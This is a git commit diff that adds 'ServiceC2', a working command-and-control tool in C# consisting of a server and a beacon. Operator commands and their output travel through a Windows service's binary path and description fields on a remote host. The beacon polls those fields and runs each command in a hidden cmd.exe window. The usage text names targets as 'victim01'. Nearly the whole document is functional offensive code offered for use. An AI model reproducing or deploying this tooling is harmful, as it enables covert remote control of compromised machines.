68b7275d124004508f61c1ecbf9ec38405d3c26f
0xfenrik <0xfenrik@protonmail.com>
2022-08-31 11:16:22 +0200

    ServiceC2

--- ServiceC2/ServiceC2Beacon/Program.cs
+++ ServiceC2/ServiceC2Beacon/Program.cs
@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Management;
 using System.Runtime.InteropServices;
 using System.ServiceProcess;
@@ -8,6 +9,9 @@ namespace ServiceC2Beacon
 {
     internal class Program
     {
+        //Handles for connecting to the remote database
+        public static IntPtr schService = IntPtr.Zero;
+        public static IntPtr schSCManager = IntPtr.Zero;
 
         [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
         public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
@@ -26,12 +30,6 @@ namespace ServiceC2Beacon
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);
-
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        public static extern IntPtr CreateServiceA(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, [Optional] string lpLoadOrderGroup, [Optional] string lpdwTagId, [Optional] string lpDependencies, [Optional] string lpServiceStartName, [Optional] string lpPassword);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        public static extern bool DeleteService(IntPtr hService);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         public static extern bool CloseServiceHandle(IntPtr hService);
@@ -62,98 +60,229 @@ namespace ServiceC2Beacon
         [DllImport("kernel32.dll")]
         static extern uint GetLastError();
 
-        public bool CreateService()
+        public static int GetSleepTime(string host, string serviceName)
         {
-            return true;
-        }
+            int sleepTime = 30;
 
-        static void Main(string[] args)
-        {
-            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
-            if (SCMHandle == IntPtr.Zero)
-            {
-                Console.WriteLine("\t[-] Failed to get SCM handle: ");
-                return;
-                
-            }
-            Console.WriteLine("\t[+] OpenSCManager [OK]: " + SCMHandle.ToString());
-
-            IntPtr schService = OpenService(SCMHandle, "ServiceC2", 0xF01FF);
             if (schService == IntPtr.Zero)
             {
-                Console.WriteLine("\t[-] Failed to get sch pointer... ");
+                Console.WriteLine("Lost handle... Trying to reestablish");
+                ConnectToService(host, serviceName);
                 if (schService == IntPtr.Zero)
                 {
-                    Console.WriteLine("\t[*] Creating service...");
-                    schService = CreateServiceA(SCMHandle, "ServiceC2", "30", 0xF003F, 0x00000010, 0x00000004, 0x00000000, "whoami", null, null, null, null, null);
-                    if (schService == IntPtr.Zero)
-                    {
-                        Console.WriteLine("\t[-] Failed to create service...");
-                        return;
-                    } else
-                    {
-                        Console.WriteLine("\t[+] Service created successfully");
-                    }
+                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
+                    Environment.Exit(1);
                 }
             }
-
-            Console.WriteLine("\t[+] OpenService [OK]:" + schService.ToString());
-
-            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, "whoami", null, null, null, null, null, null);
-            if (!success)
-            {
-                Console.WriteLine("\t[-] Failed to Change");
-                
-            }
-            Console.WriteLine("\t[+] ChangeServiceConfigA [OK]");
-
-
-            SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();
-
-            service_descriptiona.lpDescription = "Output field";
-            IntPtr sdinfo = Marshal.AllocHGlobal(Marshal.SizeOf(service_descriptiona));
-            if (sdinfo == IntPtr.Zero)
-            {
-                Console.WriteLine("\t[-] Failed marshalling");
-                
-            }
-
-            Marshal.StructureToPtr(service_descriptiona, sdinfo, false); success = ChangeServiceConfig2(schService, 1, sdinfo);
-
-            if (!success)
-            {
-                Console.WriteLine("\t[-] ChangeServiceConfig2 failed");
-            }
-            Console.WriteLine("\t[+] ChangeServiceConfig2 [OK]");
-
-
             QUERY_SERVICE_CONFIG service_config = new QUERY_SERVICE_CONFIG();
 
             uint dwBytesNeeded = 0;
             QueryServiceConfigA(schService, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
-            Console.WriteLine("Bytes needed: " + dwBytesNeeded);
             IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
             bool result = QueryServiceConfigA(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
             if (result)
             {
                 service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
-                //Marshal.PtrToStructure(ptr, service_config);
-                Console.WriteLine("cmd: " + Marshal.PtrToStringAnsi(service_config.binaryPathName));
-                Console.WriteLine("User running: " + Marshal.PtrToStringAnsi(service_config.startName));
-                Console.WriteLine("sleep: " + Marshal.PtrToStringAnsi(service_config.displayName));
-
-
+                sleepTime = Int32.Parse(Marshal.PtrToStringAnsi(service_config.displayName));
+                Console.WriteLine("Sleep: " + sleepTime);
             }
             Marshal.FreeHGlobal(ptr);
 
-            using (ManagementObject service = new ManagementObject(new ManagementPath(string.Format("Win32_Service.Name='{0}'", "ServiceC2"))))
+            return sleepTime;
+        }
+
+        public static void ClearCommand(string host, string serviceName)
+        {
+            if (schService == IntPtr.Zero)
             {
-                Console.WriteLine("Output: " + service["Description"].ToString());
+                Console.WriteLine("Lost handle... Trying to reestablish");
+                ConnectToService(host, serviceName);
+                if (schService == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
+                    Environment.Exit(1);
+                }
+            }
+            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, "", null, null, null, null, null, null);
+            if (!success)
+            {
+                Console.WriteLine("[-] Failed to clear command");
             }
 
-            DeleteService(schService);
+        }
 
-            CloseServiceHandle(schService);
+        public static string GetCommand(string host, string serviceName)
+        {
+            string cmd = "";
+
+            if (schService == IntPtr.Zero)
+            {
+                Console.WriteLine("Lost handle... Trying to reestablish");
+                ConnectToService(host, serviceName);
+                if (schService == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
+                    Environment.Exit(1);
+                }
+            }
+
+            QUERY_SERVICE_CONFIG service_config = new QUERY_SERVICE_CONFIG();
+            uint dwBytesNeeded = 0;
+            QueryServiceConfigA(schService, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
+            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
+
+            bool result = QueryServiceConfigA(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
+            if (result)
+            {
+                service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
+                cmd = Marshal.PtrToStringAnsi(service_config.binaryPathName);
+                Console.WriteLine("Command: " + cmd);
+            }
+            Marshal.FreeHGlobal(ptr);
+
+            ClearCommand(host, serviceName);
+
+            return cmd;
+        }
+
+        public static IntPtr ConnectToService(string host, string serviceName)
+        {
+            Console.WriteLine("[*] Connecting...");
+            schSCManager = OpenSCManager(host, null, 0xF003F);
+            if (schSCManager == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed to get SCM handle");
+                return IntPtr.Zero;
+
+            }
+            Console.WriteLine("[+] OpenSCManager handle retrived");
+
+
+            schService = OpenService(schSCManager, serviceName, 0xF01FF);
+            if (schService == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed to connect to service... LastError() " + GetLastError());
+                return IntPtr.Zero;
+            }
+            Console.WriteLine("[+] Service handle retrived");
+            Console.WriteLine("[+] Connection establieshed...");
+            return schService;
+        }
+        public static void DisconnectFromService()
+        {
+            Console.WriteLine("Disconnecting from ServiceC2");
+            if (schService != IntPtr.Zero)
+            {
+                CloseServiceHandle(schService);
+            }
+            if (schSCManager != IntPtr.Zero)
+            {
+                CloseServiceHandle(schSCManager);
+            }
+        }
+
+        public static string RunCommand(string command)
+        {
+
+            string argument = "/C " + command;
+            Process p = new Process();
+            // Specifies not to use system shell to start the process
+            p.StartInfo.UseShellExecute = false;
+            // Instructs the process should not start in a separate window
+            p.StartInfo.CreateNoWindow = true;
+            // Indicates whether the output of the application is returned as an output stream
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+            p.StartInfo.Arguments = argument;
+            p.Start();
+            string res = p.StandardOutput.ReadToEnd();
+            return res;
+        }
+
+        public static bool PostOutput(string host, string serviceName, string output)
+        {
+            if (schService == IntPtr.Zero)
+            {
+                Console.WriteLine("Lost handle... Trying to reestablish");
+                ConnectToService(host, serviceName);
+                if (schService == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
+                    Environment.Exit(1);
+                }
+            }
+
+            SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();
+
+            service_descriptiona.lpDescription = output;
+            IntPtr sdinfo = Marshal.AllocHGlobal(Marshal.SizeOf(service_descriptiona));
+            if (sdinfo == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed marshalling");
+
+            }
+
+            Marshal.StructureToPtr(service_descriptiona, sdinfo, false); 
+            bool success = ChangeServiceConfig2(schService, 1, sdinfo);
+
+            if (!success)
+            {
+                Console.WriteLine("[-] Output update failed");
+            }
+            Console.WriteLine("[+] Output updated successfully");
+
+            return success;
+        }
+
+        static void Main(string[] args)
+        {
+
+            bool active = true;
+            if (args.Length != 2)
+            {
+                Console.WriteLine("ServiceC2Beacon.exe <hostname> <unique identifier>");
+                Console.WriteLine("ServiceC2.Beacon.exe ws01 victim01");
+                Environment.Exit(0);
+            }
+            //Catching Ctrl + C events to clean up correctly...
+            Console.CancelKeyPress += delegate
+            {
+                DisconnectFromService();
+            };
+            string host = args[0];
+            string serviceName = "Servicec2" + args[1];
+
+            //Connecting to remote service
+            ConnectToService(host, serviceName);
+
+            //Setting up sleeptimer
+            int sleeptime = GetSleepTime(host, serviceName);
+            DateTime stopTime = DateTime.Now.AddSeconds(sleeptime);
+
+            //C2 loop
+            while (active)
+            {
+                DateTime startTime = DateTime.Now;
+                if (startTime >= stopTime)
+                {
+                    string command = GetCommand(host, serviceName);
+                    if (command.Equals("Exit", StringComparison.OrdinalIgnoreCase))
+                    {
+                        Console.WriteLine("[+] Shutting Down...");
+                        DisconnectFromService();
+                        Environment.Exit(0);
+                    }
+
+                    if (command.Length > 0)
+                    {
+                        string output = RunCommand(command);
+                        PostOutput(host, serviceName, output);
+                    }
+
+                    stopTime = DateTime.Now.AddSeconds(GetSleepTime(host, serviceName));
+                }
+            }
+            DisconnectFromService();
         }
     }
 }
--- ServiceC2/ServiceC2Server/Program.cs
+++ ServiceC2/ServiceC2Server/Program.cs
@@ -1,15 +1,235 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Management;
+using System.Runtime.InteropServices;
+
 
 namespace ServiceC2Server
 {
     internal class Program
     {
+
+        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
+
+        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
+
+        [DllImport("advapi32", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern IntPtr CreateServiceA(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, [Optional] string lpLoadOrderGroup, [Optional] string lpdwTagId, [Optional] string lpDependencies, [Optional] string lpServiceStartName, [Optional] string lpPassword);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool DeleteService(IntPtr hService);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool CloseServiceHandle(IntPtr hService);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
+        
+        [DllImport("kernel32.dll")]
+        static extern uint GetLastError();
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct SERVICE_DESCRIPTION
+        {
+            public string lpDescription;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct QUERY_SERVICE_CONFIG
+        {
+            public int serviceType;
+            public int startType;
+            public int errorControl;
+            public IntPtr binaryPathName;
+            public IntPtr loadOrderGroup;
+            public int tagID;
+            public IntPtr dependencies;
+            public IntPtr startName;
+            public IntPtr displayName;
+        }
+
+        static void PrintHelp()
+        {
+            Console.WriteLine(
+                "sleep <int>      Sets the sleep time to int given\n" +
+                "cmd <command>    Executes the value of command\n" +
+                "exit             Exits the application gracefully");
+        }
+
+
+        public static IntPtr Connect(string serviceName)
+        {
+            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
+            if (SCMHandle == IntPtr.Zero)
+            {
+                Console.WriteLine("\t[-] Failed to get SCM handle: ");
+                return IntPtr.Zero;
+
+            }
+            Console.WriteLine("\t[+] OpenSCManager [OK]");
+
+            IntPtr schService = OpenService(SCMHandle, serviceName, 0xF01FF);
+            if (schService == IntPtr.Zero)
+            {
+                Console.WriteLine("\t[-] Failed to connect to service... Trying to create new service...");
+                schService = CreateService(SCMHandle, serviceName);
+   
+            }
+            Console.WriteLine("\t[+] OpenService [OK]");
+
+            return schService;
+        }
+
+        public static IntPtr CreateService(IntPtr SCMHandle, string serviceName)
+        {
+            Console.WriteLine("\t[*] Trying to Create a new service called: " + serviceName);
+            IntPtr schService = CreateServiceA(SCMHandle,  serviceName, "30", 0xF003F, 0x00000010, 0x00000004, 0x00000000, "whoami", null, null, null, null, null);
+            if (schService == IntPtr.Zero)
+            {
+                Console.WriteLine("\t[-] Failed to create service... Could be a duplicate issue?");
+                Console.WriteLine(GetLastError());
+                Environment.Exit(1);
+            }
+            return schService;
+        }
+
+        public static void Shutdown(string serviceName, bool ctrlc)
+        {
+            Console.WriteLine("[+] Closing down...");
+            IntPtr schService = Connect(serviceName);
+            DeleteService(schService);
+
+            //
+            //
+            if (!ctrlc)
+            {
+                Environment.Exit(0);
+            }
+        }
+
+        public static void Setup(string serviceName)
+        {
+            IntPtr schService = Connect(serviceName);
+        }
+
+        public static void UpdateSleep(string serviceName, string input)
+        {
+            string sleepTime = input.Split(' ')[1];
+            int i = 0;
+            bool isInt = int.TryParse(sleepTime, out i);
+
+            if (!isInt)
+            {
+                Console.WriteLine("[!] Please provide an integer when using the sleep command");
+                return;
+            }
+            IntPtr schService = Connect(serviceName);
+
+            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, null, null, null, null, null, null, sleepTime);
+            if (!success)
+            {
+                Console.WriteLine("\t[-] Failed to update sleep timer...");
+
+            }
+            Console.WriteLine("[+] Sleep updated to: {0}", sleepTime);
+
+        }
+
+        public static void ReadOutput(string serviceName)
+        {
+            Console.WriteLine("Waiting for output from " + serviceName);
+
+            try
+            {
+                using (ManagementObject service = new ManagementObject(new ManagementPath(string.Format("Win32_Service.Name='{0}'", serviceName))))
+                {
+                    Console.WriteLine("Output: " + service["Description"].ToString());
+                }
+
+            } catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+        }
+
+        public static void UpdateCommand(string serviceName, string input)
+        {
+            string newCmd = input.Substring(input.IndexOf(' ')).Remove(0,1);
+
+            IntPtr schService = Connect(serviceName);
+
+            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, newCmd, null, null, null, null, null, null);
+            if (!success)
+            {
+                Console.WriteLine("\t[-] Failed to Change");
+
+            }
+            Console.WriteLine("\t[+] ChangeServiceConfigA [OK]");
+
+            Console.WriteLine("[+] Cmd updated to: {0}", newCmd);
+
+            ReadOutput(serviceName);
+        }
+
+
         static void Main(string[] args)
         {
+            if (args.Length != 1)
+            {
+                Console.WriteLine("ServiceC2Server.exe <Unique Identifier");
+                Console.WriteLine("ServiceC2Server.exe victim01");
+                Environment.Exit(0);
+            }
+            string serviceName = "ServiceC2" + args[0];
+
+            //Catching Ctrl + C events to clean up correctly...
+            Console.CancelKeyPress += delegate
+            {
+                Shutdown(serviceName, true);
+            };
+
+            //Setup all the requirements for the C2 server to work...
+            Setup(serviceName);
+
+            //C2 Loop
+            Console.WriteLine("[+] Ready...");
+            while (true)
+            {
+                Console.WriteLine(">");
+                string input = Console.ReadLine();
+                if (input == "h" || input == "help")
+                {
+                    PrintHelp();
+                }
+
+                if (input.StartsWith("sleep", StringComparison.OrdinalIgnoreCase))
+                {
+                    UpdateSleep(serviceName, input);
+                }
+
+                if (input.StartsWith("cmd", StringComparison.OrdinalIgnoreCase))
+                {
+                    UpdateCommand(serviceName, input);
+                }
+
+                if (input.StartsWith("exit", StringComparison.OrdinalIgnoreCase))
+                {
+                    Shutdown(serviceName, false);
+                }
+            }
         }
     }
 }
